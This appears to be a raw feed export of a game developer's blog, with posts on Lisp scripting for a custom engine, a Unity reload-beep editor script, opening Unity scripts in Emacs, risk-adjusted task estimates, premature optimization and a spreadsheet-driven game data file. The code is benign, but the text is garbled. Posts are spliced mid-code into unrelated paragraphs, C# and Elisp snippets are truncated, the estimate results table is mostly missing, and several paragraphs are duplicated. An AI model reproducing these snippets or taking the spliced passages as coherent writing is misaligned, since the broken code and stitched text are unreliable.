&lt;p&gt;Implementing Lisp, and coding with it has been very fun too. I've had the most fun when &lt;a href="http://wiki.call-cc.org/eggref/5/bind"&gt;I implemented the FFI&lt;/a&gt;. Every time I go through the wiki I find a better way of doing things so I'd go and re-implement them again. Each iteration I learn something new and it's such a joy exploring.&lt;/p&gt;
&lt;p&gt;Playing with the garbage collector has also made me think about memory management more. This resulted in having two ways to call certain API functions: one will return a pointer that will automatically get tracked by the GC. The other you'd have to free manually. I figured this is a good approach for situations when having control over memory and references is crucial.&lt;/p&gt;
&lt;p&gt;I've already spent a lot of time on this project and it was mostly spent on the scripting side of the engine. There are still more to do for it to be considered useful but I'm happy I was able to learn a lot.&lt;/p&gt;
&lt;p&gt;If you are curious about the engine you could check it out &lt;a href="https://github.com/accidentalrebel/Rebel-Game-Engine"&gt;here&lt;/a&gt;.&lt;/p&gt;</content><category term="Misc"/><category term="lisp"/><category term="game_engine"/><category term="dev"/></entry><entry><title>#1 - Thinking of adding Lisp to my custom game engine</title><link href="https://www.accidentalrebel.com/thinking-of-adding-lisp-to-my-custom-game-engine.html" rel="alternate"/><published>2020-05-03T11:19:00+08:00</published><updated>2020-05-03T11:19:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2020-05-03:/thinking-of-adding-lisp-to-my-custom-game-engine.html</id><summary type="html">&lt;p&gt;I've long wondered if I should add a scripting language to &lt;a href="https://github.com/accidentalrebel/Rebel-Game-Engine"&gt;my game engine&lt;/a&gt;.

&lt;p&gt;I like Lisp.

&lt;p&gt;This morning I started implementing a simple implementation of Chibi. Thankfully, it's easy to setup. However, the more I implement it the more that I realize that I may need to change how my engine is structured to better suit Lisp's functional nature. This means less object oriented design similar to how &lt;a href="https://www.raylib.com/index.html"&gt;Raylib&lt;/a&gt; does things. &lt;/p&gt;
&lt;p&gt;I still need some time to think this through. I am open to do the changes needed if I am to include a scripting language. I just want to make sure if my engine would really need it.

&lt;p&gt;I recently got the idea of having Unity inform me when a script has finished reloading. Instead of informing me visually, I decided that it would also be better for it to play an audible beep sound. With this, I could use the time to close my eyes, relax, or stretch. Once it beeps I'll just open my eyes and I'm back to working again. Once it beeps I'll just open my eyes and I'm back to working again. It's such a simple thing but I feel has a good impact on my health.&lt;/p&gt;
&lt;p&gt;Here's the code that I use if you are interested. Note that this is an editor script so it should be placed inside any "Editor" folder for it to run.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;System.Collections&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;System.Collections.Generic&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;UnityEngine&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;UnityEditor&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;System.Diagnostics&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;[UnityEditor.Callbacks.DidReloadScripts]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;private&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;OnScriptsReloaded&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;EditorApplication&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Beep&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The code above uses Unity's &lt;a href="https://docs.unity3d.com/ScriptReference/EditorApplication.Beep.html"&gt;EditorApplication.Beep()&lt;/a&gt; API so it should work on Windows and Mac. But since I'm using Linux to develop games on it does not seem to work for me. &lt;/p&gt;
&lt;p&gt;Here's a different version that spawns a OS process and runs the &lt;code&gt;play&lt;/code&gt; command to generate a short sine wave beep. Be sure to have &lt;a href="http://sox.sourceforge.net/"&gt;sox&lt;/a&gt; installed on your Linux machine for this to work.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ProcessStartInfo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ProcessStartInfo&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FileName&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;play&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Arguments&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;-q -n synth 0.1 sin 880 vol 0.2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WindowStyle&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ProcessWindowStyle&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Minimized&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateNoWindow&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Of course, this is not a solution to the compile time problem. I'd still have to wait for it to finish. But what I like about this is that it has turned a negative into a positive. And that is always great.&lt;/p&gt;</content><category term="Misc"/><category term="dev"/><category term="unity"/></entry><entry><title>Opening Unity Script Files in Emacs</title><link href="https://www.accidentalrebel.com/opening-unity-script-files-in-emacs.html" rel="alternate"/><published>2018-01-24T14:32:00+08:00</published><updated>2018-01-24T14:32:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2018-01-24:/opening-unity-script-files-in-emacs.html</id><summary type="html">&lt;p&gt;&lt;img alt="01" src="https://i.imgur.com/9XWvvi0.png" /&gt;&lt;/p&gt;
&lt;p&gt;I've recently embarked on a mission to fully integrate &lt;a href="https://www.gnu.org/software/emacs/"&gt;Emacs&lt;/a&gt; with my Unity game development environment. One feature that I wanted to have is the ability to open Unity scripts and text-based files in Emacs instead of MonoDevelop. This is an easy task for supported external editors but for those who aren't (Like Emacs), doing something like this is a bit tricky.&lt;/p&gt;
&lt;p&gt;Setting &lt;a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Invoking-emacsclient.html"&gt;emacsclient&lt;/a&gt; as the external editor works in opening the files but the line number is not passed at all (Or is not received by emacs. &lt;a href="https://forum.unity.com/threads/external-editor-arguments-issue.350473/"&gt;Seems to be a bug&lt;/a&gt;). This means that opening files in the Project Window works but you would not be able to to jump to lines that have errors from the Console. This, of course, is unacceptable.&lt;/p&gt;
&lt;p&gt;&lt;img alt="02" src="https://i.imgur.com/8gcVuom.png" /&gt;&lt;/p&gt;
&lt;p&gt;I've tried a number of different solutions. A lot of them are hacky but clever.

There was this one option of setting a &lt;a href="https://github.com/bbbscarter/EmacsProxy"&gt;Sublime Text proxy&lt;/a&gt; as a external editor and then having that application call Emacs with the correct line number. I was not able to make it work but the idea fascinated me. There was also one that involved using Mac OS X's Automator where you &lt;a href="https://stackoverflow.com/a/1857220"&gt;wrap a shell script as an automator app&lt;/a&gt; and you set that as the external editor. Didn't work either but it did teach me about Automator and it's future possible uses for my environment.&lt;/p&gt;
&lt;p&gt;Thankfully, there was one solution that worked and it involved creating a .cs file and setting up a function with OnOpenAssetAttribute callback attribute. This function is called when Unity receives a command to open an asset. From here we start a process that invokes emacsclient with the correct file and line numbers. &lt;/p&gt;
&lt;p&gt;Here is a short example:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="na"&gt;[OnOpenAssetAttribute()]&lt;/span&gt;
&lt;span class="k"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;bool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;OnOpenedAsset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;instanceID&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;UnityEngine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;selected&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;EditorUtility&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;InstanceIDToObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;instanceID&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

I don't think it has a name yet but my colleagues who introduced me to it says that they got it from a &lt;a href="https://www.gamasutra.com/view/feature/181992/waterfall_game_development_done_.php"&gt;Gamasutra article&lt;/a&gt; by Eric Preisz of Garage Games. Since then I've used this system in all my game development related projects and has helped us immensely in the development of our recent game, &lt;a href="http://mindcakegames.com/"&gt;Chef Wars&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I'm sharing this in the hopes that it would help others too.&lt;/p&gt;
&lt;h2 id="risk-adjusted-estimates"&gt;Risk Adjusted Estimates&lt;/h2&gt;
&lt;p&gt;The basic idea of this system is that for each task, an estimated time would be given along with a "confidence level". The lower the confidence the more padding is added automatically to the estimate for that task.&lt;/p&gt;
&lt;p&gt;It's a very simple system and is illustrated clearly in the image below:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Task&lt;/th&gt;
&lt;th style="text-align: center;"&gt;Estimate&lt;/th&gt;
&lt;th style="text-align: center;"&gt;Confidence&lt;/th&gt;
&lt;th style="text-align: right;"&gt;Risk-Adjusted&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Task A&lt;/td&gt;
&lt;td style="text-align: center;"&gt;5&lt;/td&gt;
&lt;td style="text-align: center;"&gt;2&lt;/td&gt;
&lt;td style="text-align: right;"&gt;9.44&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Task B&lt;/td&gt;
&lt;td style="text-align: center;"&gt;8&lt;/td&gt;
&lt;td style="text-align: center;"&gt;6&lt;/td&gt;
&lt;td style="text-align: right;"&gt;11.56&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Task C&lt;/td&gt;
&lt;td style="text-align: center;"&gt;10&lt;/td&gt;
&lt;td style="text-align: center;"&gt;8&lt;/td&gt;
&lt;td style="text-align: right;"&gt;12.22&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Task D&lt;/td&gt;
&lt;td style="text-align: center;"&gt;10&lt;/td&gt;
&lt;td style="text-align: center;"&gt;10&lt;/td&gt;
&lt;td style="text-align: right;"&gt;10.00&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;A legend (shown below) is used to help programmers determine what confidence level to specify based on their current situation.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Level&lt;/th&gt;
&lt;th style="text-align: right;"&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td style="text-align: right;"&gt;No clue -- don't make decisions on this. We need to talk more.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td style="text-align: right;"&gt;Hardly a clue -- don't make decisions on this. We need to talk more.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td style="text-align: right;"&gt;Someone else has done this and I read about it; job not well defined -- don't make decisions on this. We need to talk more.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td style="text-align: right;"&gt;Someone else has done this and I think I understand this; job might not be well-defined -- don't make decisions on this. We need to talk more.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td style="text-align: right;"&gt;Done something similar to this before and this relates to that work -- this estimate has a variance of +/- 50 percent of estimate.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td style="text-align: right;"&gt;I think I understand this fairly well and I understand the goal.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td style="text-align: right;"&gt;The average case for programming when the requirements are understood.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td style="text-align: right;"&gt;A confident case for programming. It's rare that something unexpected would happen.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td style="text-align: right;"&gt;I've done this before and it's very similar. If something unexpected comes up, I know how to tackle it.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;td style="text-align: right;"&gt;No matter what, I'm only going to work on this for the specified period of time&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The formula for calculating the risk-adjusted time is also very straightforward:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(estimated time * (10 - confidence level) / 9) + estimated time&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;From hereon you can easily compute for the total time and make a comparison between the estimated time and the risk adjusted time.&lt;/p&gt;
&lt;p&gt;To see how all of this works you can check out our &lt;a href="https://docs.google.com/spreadsheets/d/1KNTq88bw5qO6Ejbm71z31X-jraJDjB-9WET-2BZR2-s/edit?usp=sharing"&gt;Technical Estimate Template Sheet&lt;/a&gt; at our Google Drive. Or if you are into Emacs, I also have a &lt;a href="https://gist.github.com/accidentalrebel/0df9f9e024c7e3d433ef8a4f9fada2a9"&gt;template for that as well&lt;/a&gt; using OrgMode.&lt;/p&gt;
&lt;h2 id="how-effective-is-it"&gt;How effective is it?&lt;/h2&gt;
&lt;p&gt;The following is taken from the technical estimate I made for a recent module in Chef Wars. I've logged the actual time it took me to finish the task so the results can be compared.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;em&gt;Each estimate is in hours.&lt;/em&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style="text-align: center;"&gt;Task&lt;/th&gt;
&lt;th style="text-align: center;"&gt;Estimate&lt;/th&gt;
&lt;th style="text-align: center;"&gt;Confidence&lt;/th&gt;
&lt;th style="text-align: center;"&gt;Risk Adjusted&lt;/th&gt;
&lt;th style="text-align: center;"&gt;Actual time&lt;/th&gt;

&lt;/tr&gt;

&lt;td style="text-align: center;"&gt;51&lt;/td&gt;
&lt;td style="text-align: center;"&gt;2.99&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;As you can see that the actual times are very close to the risk adjusted times. I overshot quite a bit during the UI related tasks but the time lost was offseted by the other tasks as seen in the totals. &lt;/p&gt;
&lt;p&gt;Take note that this is just a small sample and results will vary. There are times where totals still overshoot but mostly it is just in terms of a few hours, or at worst a full day. Regardless, our overall experience has been great as it has proven to be accurate enough that we could confidently commit to certain dates and schedules.&lt;/p&gt;
&lt;h2 id="tips-on-using-this-system"&gt;Tips on using this system&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;This system works great if you know the tasks beforehand. You really need to sit down and think what the steps are and try not to miss anything and to avoid adjustments.&lt;/li&gt;
&lt;li&gt;The more granular the tasks, the easier it is to assign a time and confidence level to them.&lt;/li&gt;
&lt;li&gt;Being honest with the confidence levels helps produce more accurate estimates. It also brings to light any low-confidence tasks that are in need of reconsideration.&lt;/li&gt;
&lt;li&gt;Make the scope smaller and easier to digest by dividing your project into smaller parts (It can be by milestone or by module) and then make an estimate for each.&lt;/li&gt;
&lt;li&gt;Do this long enough and you'll get better with judging estimates and confidence levels.&lt;/li&gt;
&lt;li&gt;It helps to review and compare how long a task took against your estimates. It will give you insight why you overshot (In the example above, I learned that I am still bad at properly estimating UI related tasks. I should adjust my confidence levels for next time).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This simple system has helped us a lot and we plan to use it on all our future projects. It's not 100% accurate but it is accurate enough that we can schedule confidently with it. I would be the first to admit that it may not work for everyone but if you are always overshooting your estimates then this system might be worth a try.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TLDR&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There is more to the saying that "premature optimization is the root of all evil".&lt;/li&gt;
&lt;li&gt;Instead of asking WHEN to optimize, it is more important to ask WHAT and HOW to optimize.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;It is a well known adage among programmers that premature optimization is the root of all evil. If this is true then I must have been very close to the devil himself.&lt;/p&gt;
&lt;p&gt;During the early months of development on Chef Wars I did my best to optimize my code as much as possible.

&lt;p&gt;&lt;strong&gt;TLDR&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There is more to the saying that "premature optimization is the root of all evil".&lt;/li&gt;
&lt;li&gt;Instead of asking WHEN to optimize, it is more important to ask WHAT and HOW to optimize.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;It is a well known adage among programmers that premature optimization is the root of all evil. If this is true then I must have been very close to the devil himself.&lt;/p&gt;
&lt;p&gt;During the early months of development on Chef Wars I did my best to optimize my code as much as possible. We were making a big game and I wanted to have a stable foundation to build our game on. I obsessed over lots of things from the interconnection of the various systems to folder structures. I was happy with all that I've built, but sadly progress was slow.&lt;/p&gt;
&lt;p&gt;I realized at this point that I was optimizing too prematurely. If I wanted to reach my milestones on time then I needed to change my approach. This means leaving the optimizations for later. When is later though? I figured that it makes sense to do it at the end when all the systems are in place.&lt;/p&gt;
&lt;p&gt;All went smoothly until we reached Open Beta. The game was reported to be sluggish and almost unplayable which signaled the need to start optimizing. While I was able to optimize some parts, there were some that I could not optimize properly without undergoing a major change to the code. Sadly, rewrites were not an option as we were running out of time.&lt;/p&gt;
&lt;p&gt;&lt;img alt="01" src="https://media.giphy.com/media/26n6T9MrKZ2Qo16Vy/giphy.gif" /&gt;&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;The profiler has been really helpful in catching performance problems.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Looking back it is easy to pinpoint what went wrong. I was optimizing too early, later changed my approach only to find out that I was already too late to optimize certain critical parts. I, of course, want to prevent this from happening again. So the million dollar question is: How does one determine when to optimize? How does one know when is too early and too late?&lt;/p&gt;
&lt;h2 id="the-complete-version"&gt;The complete version&lt;/h2&gt;
&lt;p&gt;I later learned that the famous adage actually has a longer version:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Programmers waste enormous amounts of time thinking about, or worrying about, the speed of noncritical parts of their programs, and these attempts at efficiency actually have a strong negative impact when debugging and maintenance are considered. We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil. Yet we should not pass up our opportunities in that critical 3%.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="02" src="https://i.imgur.com/dqPF0cK.jpg" /&gt;&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;From Donald Knuth&amp;#39;s The Art of Computer Programming
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Turns out there was more to the saying that completely changes the lesson to be learned. Breaking it down we can infer that the author is telling us that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Too much obsession over non-critical parts wastes time.&lt;/li&gt;
&lt;li&gt;Only focus on efficiencies that matter.&lt;/li&gt;
&lt;li&gt;Optimize whenever possible, but not at the expense of the previously mentioned points.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So instead of asking WHEN to optimize, it is more important to ask WHAT and HOW to optimize. In other words, anytime there is a chance to evaluate if an optimization is needed, one needs to consider whether there really is something worthwhile to optimise, and if so, how to proceed in optimizing.&lt;/p&gt;
&lt;h2 id="answering-the-what-and-how"&gt;Answering the WHAT and HOW&lt;/h2&gt;
&lt;p&gt;Knowing how to answer the WHAT and HOW is not easy and requires both experience and careful planning to get right. The internet is a bit divided about this as nobody really knows the best answer. In spite of this, I was able to gather some helpful nuggets of wisdom during my research that are worth considering:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Be critical of what optimizations to use at each stage of the project. Determine how critical it is and if it can be done later.&lt;/li&gt;
&lt;li&gt;If setting aside optimizations for later, make sure to prepare the code so that it would be easy to do so when the time comes.&lt;/li&gt;
&lt;li&gt;Proper planning during the design stage can determine what to build and how to optimize in advance.&lt;/li&gt;
&lt;li&gt;Measuring/profiling optimizations would reveal which are the most effective to use in the future.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;There is a certain sense of pride in producing optimized and stable code. Sadly, this kind of perfection comes at a cost of time. The solution is to always consider at all times when, what, and how to optimize.&lt;/p&gt;
&lt;p&gt;This may all seem overkill to worry about but after going through 2 years worth of development on Chef Wars, I know all of this is worth taking the extra effort to do right. I hope that what I've learned may also be of use to you.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TLDR&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;All data in our game is contained in one excel file we call the "Universe".&lt;/li&gt;
&lt;li&gt;Prototypes can be done on the Universe excel file itself&lt;/li&gt;
&lt;li&gt;Iteration is easier as we only need to change one file.&lt;/li&gt;
&lt;li&gt;We made a system that downloads changes from our server so players don't need to update their builds.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;

It's kinda like a game design document but in the form of tables, columns, and rows. This "Universe" file contained everything from stats, dialogue, competitions, locations, chefs, and enemies just to name a few. &lt;/p&gt;
&lt;p&gt;&lt;img alt="01" src="https://i.imgur.com/rVZqbaH.png" /&gt;&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;This&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;definitely&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;gives&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;hint&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;what&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;guy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;Cliff&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Having a list of all the data that will be used in the game has helped us visualize the scope and the systems to be built, especially in making prototypes. One time Cliff made a simulation of the battle system using his Excel mastery. The universe data is fed into this simulation (i.e. competition level, recipe power) and the expected values are displayed (i.e. judging result, rewards amount). This mockup allowed us to see how the battles play out and made the whole thing easier for me to understand and implement in the engine.&lt;/p&gt;
&lt;p&gt;All the content of the universe file is then converted to the JSON format which is used directly by the game. Iterating on the game is easy because the file would just need to be converted again for the new changes to show up. The conversion process is done manually though using a CSV to JSON tool. I would have automated the process but didn't have the time to work on it.&lt;/p&gt;
&lt;p&gt;&lt;img alt="02" src="https://i.imgur.com/lE5zqDu.png" /&gt;&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*It&amp;#39;s like the Matrix*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Initially, when we wanted to update some values, we would need to push a new build version that players need to download. We figured that this is too cumbersome especially if we really have some critical changes we want to get out as soon as possible. As a solution to this, we made a system where a master copy of the JSONs are saved on our servers. We can change the data from here and the game would automatically download the necessary files that we changed. This is a really great feature that has helped us push important changes without having the need for a new build. But it does require a lot of bandwidth especially if a lot of players request for the new data so we do it only when needed like on crash producing bugs.&lt;/p&gt;
&lt;p&gt;As you can see, we've spent a lot of time making sure that our game is data-centric as possible and it benefitted us immensely. This approach has been so useful that we plan to use it on our future projects. And hopefully, after reading this, we've convinced you to try it out too.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;EDIT (2017-10-01):&lt;/strong&gt; Turns out the original code could not copy a region with multiple lines due to the difference in carriage return characters. This is now fixed with &lt;code&gt;(replace-regexp-in-string "\n" "\r" str-val)&lt;/code&gt;.&lt;/p&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;insert&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;entry-text&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
